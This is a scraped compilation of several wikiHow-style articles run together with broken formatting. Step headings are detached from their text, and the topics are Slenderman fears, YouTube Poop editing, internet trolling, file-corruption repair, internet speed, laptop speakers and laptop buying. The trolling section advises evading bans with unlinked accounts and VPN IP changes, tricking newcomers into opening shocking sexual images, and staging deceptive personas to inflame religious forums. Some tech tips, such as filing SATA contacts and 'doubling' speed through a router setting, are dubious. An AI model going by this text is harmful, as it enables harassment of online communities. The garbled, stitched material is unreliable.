Slenderman is a misunderstood Barney Stinson. If this is the case, it's possible that his creepily sneaking into houses is his move. The man is just trying to get some love'. Can you really hold that against him? C'mon, even a mother wouldn't love that face, much less a woman outside his family. Life's probably been really rough. He needs understanding and care.

, Think about the other part of his name -- Slenderman. He's a man. He has hopes, dreams, fears, insecurities, and desires -- loads of which are probably unfulfilled, just like the rest of us. Hell, he's wandering around the woods with no one to talk to. How terrible a fate! He probably prays for death every day, but it never comes.


Slenderman will die. That is, if you believe he's alive (more on that later). He has not been alive since the height of the Egyptian empire and he cannot haunt you forever. In fact, he probably gets a cold a few times a year. He's just like the rest of us. Mere mortal.
Names that end in -man are usually of Germanic origin. If you see him, strike up a conversation about pretzels, beer, or the current economic crisis. You might wanna stay away from WWII, for the record -- Slenderman might be Jewish. No one's seen him in synagogue, but maybe that's because he looks terrible in a yarmulke.

, Do you know how many people Slenderman could hug at once? How amazing would it feel to be in a group of half a dozen people, all sharing the same hug at the same time?! Think of the bonding! Those arms could wrap around you and keep your warm for ages. All you have to do is get on his good side.


It's highly likely that Slenderman doesn't get a lot of hugs; lots of people are probably intimidated by his inhuman-like proportions or tentacle-ness. Next time you dream about Slenderman, think about hugging him. Heck, he'll probably start blubbering like a baby and talking to you about how he was called ""Octopus Boy"" as a child.

, The guy has no eyes, nose, mouth, or ears. Think about that. He cannot see you, smell you, breathe on you, or hear you. Like, for real now. If someone put you in the woods weaponless and blindfolded, chopped off your ears, nose, and duct taped your mouth, how powerful would you be? Not very. The squirrels would even be able to take you.


Okay, okay, yeah, yeah, he probably has a sixth sense of some sort. Maybe he sees dead people. So, yeah, he can teleport. That's awesome. More on that in a bit. But even if he does have a sixth sense, you still have 4 that he doesn't.

, Those tentacle arms that pop out of his back would be delicious. Not to go all cannibalistic on you, but if you were to eat Slenderman (think battered and deep-fried)...yum. wikiHow can help you here with articles on cooking calamari and frying calamari. You don't have to eat it/him, but it would make for an interesting turn of events.


If you do ever succeed in coming close enough to Slenderman to chop off one of his tentacle arms, you probably just wanna do him off for good. If you're the one that chopped off his arm, he'd probably come after you like Richard Kimball went after the one-armed man.

Give it a thumbnail!",How to Make a YouTube Poop," 'Poopisms' are various common jokes which you may usually find in a YouTube Poop. A good way to find these may be to check what jokes popular ""poopers"" are using now.


Make sure that the Poopers you check are still making videos, because retired Poopers may use jokes that were hilarious in their day, but have now become outdated or clichéd.;
, For example:


General Poops - Your normal good YTP will obtain a various amount of methods, jokes, sounds, and visuals to keep the viewer interested. In a good YTP, you may see random chopping, distorting the volume of a clip to be extremely loud, sentence mixing/word splicing, visual jokes, colorful and eye popping video effects, and other things all put together to make an enjoyable or even funny video.

These poops have a cult following and are a very controversial subject among the community, and is considered an ""either you love it or you don't"" thing in YTP.


Dinner Spaghetti Poops - The name of this style of Poop derives from originally popular quotes from the sources of the day. This is a style that is accepted only by Internet meme-loving kids, and is not considered funny or original by the actual YTP community other than the ton of mainstream ""meme freaks"" and sometimes people who have just started watching YouTube Poops. The best thing to do is stay away from these poops and try not to get caught into their style unless you absolutely find it funny, as only a small group of people actually enjoy them. The best way to tell if a YouTube Poop is a Dinner Spaghetti poop is by looking at the title and thumbnail; it may say something like ""The King Must Die"" or ""Mario is Shoop Da Woop"" and mostly uses scenes from the CD-i games. Similar poops to this are Dinner Pingas Poops, which will involve something to do with the king and Dr. Robotnik from the older ""Adventures of Sonic the Hedgehog"" series. These poops should also be avoided if you plan to become well-known.
Some Poops usually have extremely loud segments throughout the whole video. Normally, they are abundantly accompanied by random visual effects to keep the video entertaining.
Flash Pooping involves special effects made with programs such as Adobe Flash and Sony Vegas Pro. This method of pooping has been long retired and is no longer commonly practiced, though there are a few people who still stick to flash like MeeStarStudios. Flash Pooping used to be hated in the past, but people have widely accepted this style in recent years.
Some YouTube Poops are based on RPG fight scenes such as Final Fantasy. These are called YTPRPG's
Some YTP's may have a storyline or a strong sense of continuity. Most notably ""The King Gets A Car"" and ""Morshu Gets A Car.""
YouTube Poop Music Videos, more commonly known as YTPMV's, are another style. It can be a lot of things from a ""poop"" source character's words edited to sound like an existing song to a source character's words slowed and sped up usually to a basic beat to sound like a rhythm. It is recommended that you gain sufficient experience before attempting one of these, and that you know how to read and obtain sheet music (unless you're doing rap).

, Windows Movie Maker, a basic video-editing program that comes with recent versions of Windows until Windows 7, should be sufficient; however for many, it is considered extremely hard to work with and slow. Many other poopers have resorted to using Sony Vegas or Adobe Premiere to make their videos. Beware if you try to illegally obtain it as it is very expensive and can result in lawsuits.

, Some common targets are video game cut-scenes and obscure cartoons from the 1990s. However, almost any source - even a lack of one, in one YouTube Poop's case - can be used. The six things which it is possible to make a YouTube poop from are films, TV shows, online videos, computer games, advertisements and music videos. Children's shows such as ""Spongebob"" and ""Blues Clues"" are quite popular.

, Use YouTube video downloading software to obtain the video you wish to edit. The most commonly used is Any Video Converter (AVC).

, This is done using the splice tool often found in video editing software, that allows you to create easily manageable parts. Be careful not to make it too small or it may be more unmanageable.

, These may include duplicating sections (mostly smaller than half a second and with random pitches on each one), adding flashes of images or text (known as ""Subliminals""), splicing character's words to make them say new things that they didn't say before (most commonly used are cuss words and sex jokes, though that is considered overused and continues to drop in popularity), raising the volume of a clip to extremely loud levels, or inserting clips from other videos.

, You need to ensure the video is coherent, plays smoothly, and has no mistakes. During this step, you can also add/change new jokes or elements. Try to go through frame-by-frame and search for errors while you edit if you can.

, You can also save it as a project for later editing. To make an even more enjoyable ""poop,"" take the ""pooped"" video and further ""poop"" it to make it better. There is a little-known video called ""Chain YTP.wmv"" that shows a decent example with the whole community taking place, with input from various styles.

, The common naming scheme is ""YouTube Poop: Creative Title."" This approach is no longer commonly used by the newer ""poopers."" A lot of people will leave ""YouTube Poop"" out of the title to make it shorter, although this makes it harder to find and may inadvertently attract ""trolls.""

, Youtube will automatically add a thumbnail to your video. This is usually a still frame from your video. You want a thumbnail that summarizes your video, and a still frame from the video isn't gonna convey that well.

Do your research.,
Do the math.,
Use him as a portkey.,
Use him as a TARDIS.,
Find the source of those creepy noises.,
Act like he's your BFF.",How to Get over Your Fear of Slenderman2," He is not real, so what's the point in being afraid? He was a meme invented in 2009 by some guy named Victor Surge on the Something Awful forums. Turns out Victor Surge goes by ""Eric"" and lives in Japan.Maybe Eric has a mermaid girlfriend named Ariel and spends most of his time on boats. Terrifying.


Slenderman was part of a contest. Part of a contest ran by amateur artists that were interested in Photoshop and the paranormal. He is the figment of some guy's (Eric's!) imagination and thousands of people took off with it, making their own stories.

, There is very little actual evidence that can be traced back in history linking to Slenderman (what little evidence there is is made up). So, beyond popular belief, he's not real. And if he is, think about it. There are about 7 billion people in the world and just as many places, in fact many more, where he could be (if he were real). What are the odds that he's coming after you?


What makes you so special that Slenderman would show up on your doorstep? Unless you're leaving him milk and cookies, he probably won't. Think of it like Santa Claus (unless you believe in Santa Claus). How long did it take you to say, ""Mom, Dad. There's no way Santa can hit all the homes in the world in 8 hours' time, especially with the time it takes to climb up a chimney. I know it's you""? This is pretty much the same thing, only he doesn't have a booming laugh or a tummy that rumbles like a bowl full of jelly.

, If you think about it, Slenderman would make a pretty cool superhero. He can just pop up in places randomly! How sweet would that be?! All you have to do is get close to him, latch onto him, and wait for him to teleport. Like a portkey in Harry Potter. Heck, maybe he could teach you how to do it!


When you start being able to teleport, you're gonna become so popular. Slenderman could be your ticket to being the big cheese. All you've gotta do right now is think about whether you'd use your powers for good or evil.

, Not only does it seem like Slenderman can teleport, but he can travel in time. You know how you're walking around the woods at night, and then all of a sudden you wake up in the daytime? What's up with that? Oh yeah, Slenderman is a TARDIS. You want to go back and retake that Chem test? No problem, friend.


The jury is still out on whether he's going forward or back in time. Science says that traveling backwards in time is impossible, but even Stephen Hawking says forward time travel is possible (if you go fast enough, time slows around you while it stays ""normal"" everywhere else). Provided Slenderman abides by the laws of physics here on Earth, he's going forward in time.So, oops, that Chem test may not be happening. Sorry.

, Sitting huddled in the corner under your Snuggie while you keep your ears open will only make you hear more noises. Instead, get up! Go looking for its source. Maybe you have mice. If you hear a weird noise or a whisper out of nowhere, don't automatically link it to Slenderman. It's probably not him.


Slenderman doesn't really make noise. If you do hear a noise, it's anything but Slenderman. Big Foot makes noise -- maybe it's him.

, ""Hey, Slenderman! What's up ma man?"" Imagine that if he's there, you're gonna have a slendy party. Do the wave and eat some Doritos. If nothing else, he'll initially be freaked out by your warmth and gumption. No one else has the cajones to be so friendly and inviting!


You may need some low-cal snacks and bottled water on hand. Slenderman is really self-conscious about his weight. The tortilla chips are just for you. Offer him some out of courtesy, but keep alternatives on hand for good measure.

"
"
Face your own personal demons.,
Overcome your fears with exposure.,
Calm yourself down.,
Empower yourself.",How to Get over Your Fear of Slenderman3," You have to be willing to stand up to him. If you don't find the courage to let go of your fears, then you may never get over that. Since it's highly doubtful that you'll ever meet him, remind yourself that the real fear is fear itself. You know he's not real, you're just paranoid that he is. Is there something else you're actually afraid of? Do a little self-analysis. You're probably not scared of suits, tall people, or skinny people. What's the bigger issue at hand?


That's definitely easier said than done. To start facing your demons, grab a notebook and start analyzing your fear. When did it start? What's the root of it? What times of day is it worse? When does it spring up (when you're alone, when you're sad, etc.)? Seeing your own patterns will force you to realize how much of this is just in your head and is truly groundless.

, Let's say you're afraid of spiders. One day, you put yourself in a room 12 feet (3.7 m) away from a spider until you're okay with it. The next day, it's 10 feet (3.0 m). A week later, you're sitting next to it. Eventually, the spider is on your hand and you're okay. Anything can be gotten used to with enough time. That's why that Taylor Swift song you initially hated is sort of tolerable now.


This process is called deconditioning. It's a thing and it works. So open up the game. When you face Slenderman, sit there. Look at him. Don't run away. Just stand there until your heart beat slows down. You may not believe it, but slowly you'll grow bored of him. You'll wonder what ever frightened you in the first place.

Start doing this gradually. Monday, do it for 5 minutes. Tuesday, for 10. Eventually you'll be unmoved by him completely.



, If you freak out and run through the house whenever you think he's there, don't let yourself. If you think he's behind you in the basement, take a deep breath, sing your favorite song and calmly walk up the stairs. Your body often cues your mind (and not the other way around), so if your body stays calm, your mind may too.



Breathe. Breathe slowly and deeply. It gets your heart rate down, your mind on other things, and a little more reassurance that he's not after you. When you take controlled, relaxed breaths, your anxiety will automatically lessen.

, Alright, so a lot of this article has been poking fun at Slenderman. But if you're truly scared of him, all the jokes in the world won't be helpful. The only thing that will be helpful will be empowering yourself. You're afraid of what he represents to you. Not what he is, or what he's capable of. If you change your image of him, you won't be afraid of him anymore. Realize that you have the power.


You know how some people are afraid of heights, closed spaces, or clowns? And how other people aren't? Fear is in everyone's head. When you start imaging Slenderman in his tighty- whities, sleeping like a baby in the fetal position, you start giving yourself control and taking it away from him. Next time you run into him, don't even offer him the Doritos. You have all the power.

Be sure to include a link to your same type of group.",How to Be a Troll," There are good trolls and there are bad trolls. You want to be a good troll. Griefing, flaming and generally being an annoying jerk will only get you reported and eventually banned. If you want to remain in the community, be funny, be clever, and be a troll that people enjoy watching. Know your audience, know what they will expect and tolerate and you will be able to bring smiles and lols to everyone.


Making a moral point with your trolls or making a game out of your trolling (for everyone else, not just you) is a good way to make sure your antics are accepted within the community. You will be seen less as a jerk and more as the class clown.;
, You’re going to need lots of different accounts on each of the the various sites and games you plan on trolling. Usually a site will not let you start a new account with an email that is registered to a different account, so you’ll need an email for each account that you create on a site.

, Don’t use variations on the same screen name, don’t use the same password, and don’t use email addresses which are very similar. Essentially, don’t leave any evidence that your various accounts are connected. This will help keep all of your accounts from getting banned if just one gets reported and caught.

, Let’s be realistic, the things you do on the Internet? You should probably be using a VPN anyway. VPNs, or virtual private networks, feed your internet traffic through a third or fourth party, letting you appear to be somewhere where you are not. How does this help with keeping your troll bridge from getting crashed? Most VPNs will let you change your IP address at will. This means that you can get in trouble on a site with one IP address and they won’t know to ban another account which uses a different IP address.

, A classic and highly regarded example of video game trolling is from renowned trollers, Team Roomba. A fan favorite was from Team Fortress 2, where they blocked other people's ability to progress in the game and forced them to answer trivia questions to proceed. Can you name all the oceans on Earth?

, A classic example of forum trolling can be seen with 4chan's (well, anything 4chan, really) Gold Membership prank. Posts were created with titles like “Top 100 Funny Pics From 4chan (NSFW)” but the images were merely messages prompting users to get non-existent Gold Memberships for the site in order to see the pictures.

, Again, nix the YouTube in favor of Tumblr or blogs. However, YouTube is an excellent example of the kind of comments you'd want to post. For example, going to blogs about body modification and asking why guys with gauges have Oreos in their ears. Classic.

, Troll Yahoo Answers and similar ""asking"" websites for a bit of quick fun. This is a great place to use the Advice Trolling and Snipe Hunting method. If someone comes to the Internet expecting someone to do their homework for them, they deserve everything they get, right?


Look out for questions which are trolls, though...like the classic one where the 'mom' is asking why her daughter likes to sit on the dryer. The trolling goes both ways in these places.

, If you want to make the holy grail of trolls, you're going to have to go a little bigger than a few forum posts. Some of the greatest trolls are entire websites or shows. The best examples of this conform to the ""Shock Value"" trolling method.


The Onion, The Daily Show, and the Colbert Report are three trolls that make fun of modern news outlets and modern American society. The early years are the best examples, where the right-wing politicians and pundits who are so frequently the butt of the joke still weren't in on the joke.
Landover Baptist and Objective Ministries are two websites which troll by making fun of fundamentalist Christian churches and beliefs. Many people don't realize that they are, in fact, not real.

, You can troll real life too. The Patriot Guard Riders troll the Westboro Baptist church like a boss. Obama's 2013 White House Correspondent's Dinner speech with the video of his birth? Pure win.

, The troll face. Yo mama. Please. Derp. Challenge accepted. Haters gonna' hate. Know your memes and know how they should be used. Most have a particular meaning or connotations. Use one incorrectly and everyone is just going to be like “WTF are you doing dude?!” Use one cleverly and everyone will be dying with laughter. Just be warned that using older memes will get you marked as a ""Normie.""

, Don’t use memes too much. Every other response shouldn't be a meme. You should not be a permanent trollface. This give you none of the character and originality that will make you an accepted feature of a community.

, Memes get old fast. These ones I have presented may be too old by the time you read this. This is a curse of the rapid-changing environment that is the Internet. After awhile, it’s kind like that guy that just goes around quoting Seinfeld or Friends all the time. Like, okay, we get it. It was funny. In the 90s. So, try to lay off the Numa Numa and Peanut Butter Jelly Time.

, Memes are all well and good; they’ve got a time and place where they can really add humor to some tense situations or bring someone a badly needed laugh. But try to bring some of your own, original humor into the situation as well. Who knows, maybe you’ll be the next Leeroy Jenkins.

, This is a common trolling method, in which you lead your audience to believe that you honestly think something that you don’t. Pulling off this troll means finding a space where people usually express their opinions. You can shout about how you’re sure Obama is an alien bent on stealing the world’s supply of classic Transformers action figures while you’re in the middle of a grocery store, but you’re unlikely to get very much attention. Unless it’s from police. Tumblr is a great target for trolling because many tumblr-ites are very sensitive. 4chan, especially /b/ is a bad target because of the anti-pc nature of the site.


Common targets are political or religious forums. Or anything to do with politics and religion. Man, people really cannot keep it together when it comes to these topics. These are the easiest trolling targets and a great way to cut your teeth.

, Ifunny has a lot of sensitive people as well as a lot of trolls, so finding targets is easy, as is getting support for your cause.


Avoid YouTube comments. YouTube is 100% trolls. You will not stand out and your brilliance will be wasted.

, Just going to some religious forum and posting “god is a fag!” really isn’t the best strategy. Mostly everyone can tell you’re a troll. A good troll will spend time carefully constructing the perfect prank. Make them think you’re legit. And then mess with their minds.


For example, spend time in that community making comments and posts which seem normal, before slowly going through a “crisis of faith” and eventually going full-blown crazy-pants. Then say that God perhaps intends for everyone to sleep with members of the same sex. People won’t see it coming.

, You can ask questions about or explanations for the more mainstream view of something, while absolutely standing by your crazy opinion being the only one that makes sense. You can go on for ages about how wonderful your opinion is and express confusion as to why no one agrees with you. And if someone says there’s no way you’re serious, you’ve got to be a troll, just act confused as to why they would think that.

, This is trolling in it’s purest form, as the origin of the term stems from the phrase “trolling for noobs”. This meant to make obvious who was new to the community (or internet as a whole) by exposing their ignorance. Now, you’ll want to browse forums and comment sections for people asking for help on really basic things. Things that they really should be Googling to begin with...

, Write a post that is sort of helpful but with advice that is really too general to really work on its own. Cap off the response with a link (use hypertext if you can) to something truly awful and horrifying and put in some comment about “If you’re still confused, go here for more information”. Just give them the impression that it’s legit. People who know better will recognize the link and know you’re joking.

, In order to pull this off well, you’re going to have to cultivate a collection of the worst stuff on the internet. Lemonparty-level is a pretty safe bet, although you can go more towards the “Oh god my eyes” variety or a nice “Can wash, can wash, but will never be clean” if you’d rather.


Good examples of terrible images include anything where a penis is somewhere a penis really shouldn’t be.

, This method, also referred to as the Bait and Switch, is usually used to respond to people being way too excited about something. A movie about to release, a video game that’s in development, every time Benedict Cumberbatch steps out his front door (if you’re trolling Tumblr)....these are all great opportunities to take advantage of someone’s excitement. Wait for something big, where people are being really silly and obviously care way too much, then roll out the trolls.


Something that people anticipate but that isn’t likely to exist any time soon is another great opportunity for Rickrolling.

, They’re waiting on the first images of the new Sailor Moon series? You’ve got exclusive screenshots from your graphic designer friend in Japan! They can’t wait for the next Star Trek movie? Secret location scouting started in your city and you caught some footage on your cell phone! Make people think you’ve definitely got the goods.


Really sell the idea by giving a review or general opinion on whatever it is you’re posting: “These Half-Life 3 designs are okay but I preferred the original. What ever happened to good taste?”

, Instead of linking to the thing that people are now expecting, creatively link to a YouTube video of Rick Astley’s Wagnerian “Never Gunna Give You Up”, because it is sorely under-appreciated. Of course, linking to anything that makes it obvious you were joking will generally do the trick. Nyan cat is nice.


This troll is much more common among friends and is considered less mean than other forms of trolling, since it is usually pointing out a very legitimate fault in the community.

, If you find a group just like yours, you can post links to take their members. Instead of posting to newsgroups or the search engines like the rest, just take this shortcut.

, Don't forget to include links on how to get to your group and then when they get there, don't forget to state why your group wins over the other group, so they feel that there is a competition.

, Ie: (Join a hat group and post a link to your hat group"") This is called ""trolling for memberships"".

Find your idea.,
Remix your video.,
Upload the video to YouTube and give it a title, a synopsis and tags.",How to Make a YouTube Poop Short," It should be something with a common theme, not just random nonsense. A YTP Short will often be a minute or less, so try to make it long enough for it to still tell a story. Don't drag it out. Going on about the same thing for too long gets boring and you will lose your audience.;
, This is especially important in a YTP short since they lack the depth of a regular YTP. Be sure to repeat, edit the picture, and add some short conversations between characters here and there. Do not repeat too much or your video will look unprofessional.

, The title is especially important. It should be (but doesn't have to be) something that has to do with the story. Choose tags and a category that fit the video. Send your video to friends and others on YouTube and Google+ to boost views and encourage your audience to comment and rate.

Clean your SATA cables.,
Reconnect the cables to the hard drive inside the CPU box.,
Ensure that it fits without restriction.,
Improve the connectors at the contact point.",How to Fix a File Corruption Error1," If your SATA hard drive cable connector has metal latches, follow these steps:


Unplug both ends of the SATA hard drive cable.
Blow out both of the cable ends and where they plug into the back of hard drive and mainboard/motherboard with canned air or air pump.
Clean the ends of the cables and where they plug into with a toothbrush and rubbing alcohol or surgical spirits.;
, When it is totally dry, reconnect the SATA hard drive cable to the back of the hard drive and to the mainboard/motherboard. It can only go on one way; you can't accidentally reverse it like ATA cables in old days; it has an ""L"" shape to prevent this.

, Be sure there is no stress anywhere in any part of the SATA cable, for example from the side of computer case or another component pressing on it. Any stress may cause the connector ends to work partly loose, which will cause more data corruption and data loss (more CRC errors). If there are any bends in the cable around corners which may accidentally get pressed on, try using sticky tape to secure the bend in the best location with the least stress on the connector end. If you have a very tight bend or if it is impossible to reduce stress on the cable enough, you should buy a right angle or left angle SATA cable; they are designed for these tight corners, and have 90 degree angles relative to the cable to insert without too much stress in tight spaces.

, Your SATA cable connectors may have poor contact design, or the metal may have oxidized/rusted over time. If metal electrical contacts are rusted/oxidized, and you have no money, use a small thin metal nail file to bring shine back to contacts and restore good electrical connection of cable ends. If you have money, and you want to try new SATA cables instead, you can purchase a new one, but there is no guarantee the contact design will be even as good as the cable you are replacing, since many aftermarket replacement SATA cables have poor contact design. Two things you have to watch when bringing shine back to contacts are:


Do not press too hard down on contact or it will not make contact when you are done. #* Be careful not to wear away too much, and try to target sanding action to right location. You will have tiny bits of plastic and metal that flake off as you work, so use a dry toothbrush and dust out connector end afterwards to make sure these particles are gone before you use the cable again.

Look for signs of a failing hard drive, or for defective parts inside of the CPU case.,
Ensure the problem doesn't lay within the software of drivers that the hard drive rests upon.",How to Fix a File Corruption Error2," The RAM installed into your mainboard/motherboard could be defective or its contacts may have come somewhat loose. Try repeating Steps One and Two on the RAM and its cable. Allow to dry completely, alcohol will evaporate by itself given a little time. Then put your RAM chips back in, they only go in one way, not both ways. Do not force them, you may have them in the wrong way. There is a slot that lines them both up on bottom. Get it lined up to the slot in the socket. Then press gently down; it should go in, press from the top middle, or both sides of top at same time. As you press down it should go into socket and clips should start to close on both sides of socket. You may need to press plastic clips on each side a bit to make them lock, they have bits on inside ends that press into half circle openings on sides of RAM chip. They should make satisfying click sound when closed and properly installed. Then hold top of RAM chip from both sides, or middle, and gently press down and vibrate fingers slightly to work it gently down into socket to make best contact. Release when you feel you have firm but gentle fit.

, Try to find the problem with softwares.If cleaning and replacing RAM doesn't fix issue, you might want to try testing your RAM to see if it has become defective. To do this, you should download the Memtest86+ software to run from floppy disk, CD/DVD, or USB flash drive and test your memory for defects.

Backup your data and erase and reformat the partition of the hard drive.",How to Fix a File Corruption Error3," Check if it is just old problem caused by previous file or data corruption. If it is, you can copy over backup of data, reinstall software, or in worst case, erase and format system partition or entire hard drive and reinstall operating system and it should be fixed. Another possibility for source of your file or data corruption, some viruses are known to install system level drivers into your operating system, which is probably Windows, since most PC viruses are written for Windows and not other OSes. Sometimes these system level drivers can cause data corruption. If you think that may be the source of your problem, you should erase and format your hard drive and do fresh install of your operating system (probably Windows).

Investigate your hard drive.",How to Fix a File Corruption Error4," If you still have new file corruption, data corruption, new CRC errors, additional SMART CRC errors, etc, possibly your hard drive is failing and needs to be replaced. One way to determine if this is the case is that sometimes when hard drive is failing, it makes different noises than usual. Sound for normal hard drive operation, is sort of like soft, gentle finely grained sound somewhat similar to stepping on very fine gravel with padded shoes. If you hear more sudden, sharp, raspy, pinging, or louder grating type sounds, and it is not normal pattern for your hard drive, it is possible it may be failing. When hard drives are failing, they don't always make these unusual types of sounds, but sometimes they do.

Change your location if using wireless Internet.,
Turn off all Internet using devices except your own.",How to Double Your Internet Speed1," Wi-fi is super convenient, and it might be the way to go for your handheld devices, like your phone or tablet. But some studies indicate that by using wireless Internet, you could be reducing your speed as much as 30%., Older routers could suffer from outdated components that might be limiting your access to the data for which you're paying. Routers range from the ultra-expensive to the bare-bones basic, which could range in cost from $20 to over $10,000.For most home users, a router in the $20 to $50 dollar range should be sufficient for your Internet needs.


Wireless boosters and directional antennas can salvage wasted data by either directing wireless data in a more concentrated fashion or by making it easier for your computer to pick up the wireless signal.Decide if one is right for your situation by searching ""wireless signal boosters"" or ""wireless directional antennas"" online.

, Many modems are provided by your ISP for a small monthly rental fee, but rental fees stack up and sometimes the modem you are renting is less than optimal. Do an Internet search of which modem will work best with your Internet connection, and if you find the one provided to be lacking, upgrade to a newer model.


Some experts suggest you upgrade your modem every three years to guarantee maximum efficiency., Running technology for long periods of time can create a backlog of errors, recorded files, updates, and it can put strain on it from the constant usage.Though this isn't guaranteed to improve your Internet speed, resetting your router and modem weekly can have a noticeable improve Internet speed.

, If you are using an older computer or device, your internet speed issues might simply be the result of outdated technology, insufficient RAM, or inadequate processing power.A new, fully updated device, might be the only way to improve your speed if this is the case.

, Moving your device closer to your wireless router, in the event you are using wireless for your device, can significantly improve your signal strength and speed.Walls, furniture, or household items might be interfering with or absorbing your wi-fi signal, and a small move can sometimes make a big difference in speed.


Re-positioning your router might also be a good idea, especially if signal strength is an issue with your Internet., If several users in your household are using the Internet at the same time, the max Internet speed being provided to you will be divided among the devices. Even if you aren't directly using your phone or tablet, leaving those devices on and connected to the Internet can steal precious bandwidth from you, slowing down your speed.

, Windows 10 shows fewer details by default, so if you see this message, click it before continuing.

, At any given time, your computer is running a lot of processes—some of these are launched automatically by Windows. Some programs even launch several processes (this is normal). Notice the category columns containing percentages. The percentages show how much of each resource is being used right now. The process names are listed in the left column.

, You will want the highest numbers to appear at the top. Each column represents a different resource:


CPU: This column shows the percentage of processor (the “brain” of your computer) resources utilized by each process.
Memory: Shows the percentage of RAM used each process.
Disk: Newer versions of Windows use this column to report how much hard each process makes the hard drive work.

, Using the “End Task” feature will kill the process, which should improve system speed. Keep in mind that some programs will automatically relaunch processes. If you don’t know what the process is, try searching the net for “what is .”

, This will launch the System Configuration panel. If you’re using Windows 8 or later, move to the next step.

, Having too many programs start at boot time slows down your computer. Programs that are set to start at boot time are marked with a checkmark (Windows 7 and earlier) or listed as “Enabled” (Windows 8 or later).

, If you’re using Windows 8 or newer, select a program, and then click “Disable.” Users of Windows 7 and Vista should remove the checkmark next to any apps you don’t want to launch when the computer starts.


Note that certain applications require certain startup programs to run properly. Look at the “Publisher” or “Manufacturer” for hints on what programs this startup program might effect.
You can always re-enable startup programs later.

,,, Confirm that your system meets (and hopefully exceeds) the minimum requirements to run your software by comparing the computer specs found here to the software manufacturer’s manual.


RAM: Scroll to “Installed Physical Memory” to find the amount of RAM installed on the system. These days, a PC with 4GB of RAM or less is going to perform rather slowly compared to one with at least 6GB.
Processor: Some programs require a certain speed or type of processor. Compare what’s listed here to what’s required by programs you need to use.

, Use this guide to help you scan for and remove rogue applications that may be hogging your resources.

, After you’ve completed the steps in this method, try using your computer as you normally would. If you don’t notice an improvement in speed (and have already verified that your hardware specs meet or exceed the needs of your software), try optimizing your hard drive and checking the hardware.

, This might not work for all devices, so check online first to see if your device can handle an un-bridged router. Most newer model routers will likely support this feature. Access your router to un-bridge by typing your IP address (AKA the default gateway address) into your browser. Now that you've accessed your router, navigate to the section that says ""Wireless Interface Type"", which is frequently located under Advanced Wireless Settings. Change this from 802.11b/g/n (20MHz) to 802.11n (40MHz). This adjusts the maximum throughput of the router from 300Mbps to 600Mbps, creating twice as much bandwidth and, potentially, twice the speed.If you have difficulty accessing your router, the default gateway number is ""192.168.0.1"". Typing this into your browser should prompt a dialogue box asking for your username and password.

, Whether on a phone or some other device, unnecessary applications running in the background can steal your processing power and bandwidth. Get rid of any applications that are unnecessary or unused. If you are unsure whether an application is necessary or not, a quick internet search of the entire name of the application should reveal whether or not you can trash it.

, Too many applications running on your device can overwhelm it, effectively slowing your Internet. Even applications running in the background can have this effect.Uninstall any programs that you don't need.


Smartphone applications are known bandwidth hogs, some studies claiming that smartphone software can use up to 10.7MB per hour!, There are plenty of free basic services and more comprehensive pay-to-use services that you can find with a quick search online. Viruses and malware can create a bottleneck that limits your access to the Internet and hurts your speed or else bogs down your computer to the point that it can't get online.Do not install more than one anti-virus program, as different programs can conflict with each other, hurting your speed., There are add-ons available to you that will preload links before you click on them, which will make your browsing seem instantaneous. Depending on the add-on you use and the device you use it on, this can jump your bandwidth usage anywhere from 2x - 10x your normal speed.


Install add-ons with caution. Some of these are simply malware masquerading as a helpful program, and too many add-ons, even those that claim to help speed, will eat up your processing power and decrease speed."

Choose a set of computer speakers.As long as your laptop has a USB or speaker/headphone jack, you should be able to use most wired computer speakers.,
Arrange the speakers in your workspace.,
Turn the speaker volume to the minimum.,
Adjust the volume on your laptop to about 75%.You can do this by clicking on the sound icon in the taskbar (bottom right corner on Windows) or menu bar (top right corner on Mac) and sliding it up about ¾ of the way from the top.,

Turn the speakers on.,
Play some audio on your laptop.",How to Connect Speakers to Your Laptop1,"


Most computer speakers have a 3.5mm (1/8"") audio output connector, which is the small plug that will fit into a typical headphone jack. These speakers will also need to be plugged into a power source.
USB speakers are powered by your computer so they won’t need to be plugged into the wall. If you have available USB ports, these might be more convenient.;
, Most speakers are clearly marked as Left (L) or Right (R) on the back or bottom of the unit. If your speakers come with a subwoofer, you may want to put it behind your system or on the floor. Make sure that wherever you choose to place your speakers, the connector cable will reach its corresponding input on your computer, and the power cable (if you have one) can safely reach an outlet.

, This is done by turning the volume dial on the speakers (there’s only one) all the way to the left.

, Windows users will probably see two different sliders—use the one that says “Applications” above the slider.

, With your laptop turned on, plug the audio connector cable (the USB or 3.5mm (1/8"") connector) into its corresponding port on the laptop.


If you’re using a 3.5mm (1/8"") connector, look on the sides of your laptop for a small jack that has a drawing of headphones or a speaker. Don’t plug it into the jack with the drawing of a microphone.
If you’re using USB, plugging in your speakers may trigger the system to start installing drivers. If you are asked to insert a disk, insert the one that came with your speakers and follow any instructions that came in the packaging.

, The On button is usually located on the back of one of the speakers. If your speakers have a power cable, plug that in before turning the speakers on.

, Start some audio (streaming music, a CD, a YouTube video, etc.) on your laptop.


Find a comfortable listening volume. Slowly turn the volume knob on your computer speakers to the right until you reach your desired volume.
If you don’t hear anything, make sure the speakers are connected and plugged in if necessary.

Take good care of your new laptop.",How to Buy a Laptop," If you haven't had a laptop before, it can be a good idea to consider the possible benefits of owning one. When compared with a desktop, laptops have quite a few advantages.


You can take a laptop with you wherever you go, even abroad provided that you take a power adapter as well.
Many laptops can do what we expect most desktops to do. While you may not be able to run the latest games at their highest settings, most modern laptops are quite capable for all different tasks.
Laptops save on space and are easy to move out of the way. This makes them great for small apartments, or for using on your bedroom desk.;
, While laptops are great for portable computing, there are a few significant drawbacks. While these shouldn’t scare you away if you really want one, they are good to keep in the back of your mind while shopping.


Laptops are easy to steal if you forget to take care when traveling with them.
Their battery life isn't extraordinarily long and can be frustrating if you want to work without electricity for a long period of time, such as on a plane or sitting at the shore near your vacation cottage. If you plan on traveling a lot, battery life will be very important to you.
Because laptops typically can’t be upgraded like a desktop can, they can become obsolete quicker. This may mean you find yourself upgrading to a new laptop again in a few years.

, Since laptops have such a wide variety of uses, it will help to focus on what you plan to use the laptop for when you’re comparing models. If you plan on mainly browsing the web and writing emails, you’ll have a lot different needs than if you want to play games on the go or produce your own music.

, It's important to know how much your budget is before you start looking or you might be swayed by long-term interest-free sweeteners to purchase something beyond your means. There is a large range of laptops available and setting a limit will ensure that you enjoy the laptop you can afford, without being prevented from upgrading later on because you're still paying off the old one! Decide what aspects are important to you and fit these within your budget.

, The two main options are Windows and Mac, along with Linux for the more tech-savvy. A lot of the choice will come down to personal preference and what you’re familiar with, but there are some important things to take into consideration.


